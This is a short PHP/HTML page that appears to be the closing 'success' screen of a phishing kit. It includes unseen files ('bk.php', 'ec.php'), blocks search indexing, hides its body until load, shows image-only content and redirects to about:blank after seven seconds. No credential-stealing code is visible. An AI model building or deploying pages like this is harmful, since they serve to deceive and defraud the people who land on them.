<?php
require_once 'bk.php';
$redct="about:blank";
require_once 'ec.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<title>-</title>
<link rel="SHORTCUT ICON" href="wp/ico.ico" /> 
<meta http-equiv="refresh" content="7;url=<?php echo $redct; ?>"> 
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body onload="unhideBody()">
</head>
<body style="visibility:hidden;margin:0;padding:0;font:13px/1.231 arial,helvetica,clean,sans-serif;*font-size:small;*font:x-small;background:#e5e5e5;">
<div style="margin:0 0 0 0px;"> 
<img src="wp/suc.png">
</div> 
<div style="margin:-39px 0 0 189px;"> 
<img src="wp/fot234.png">
</div> 
</body>
</html>
<?php ob_end_flush(); ?>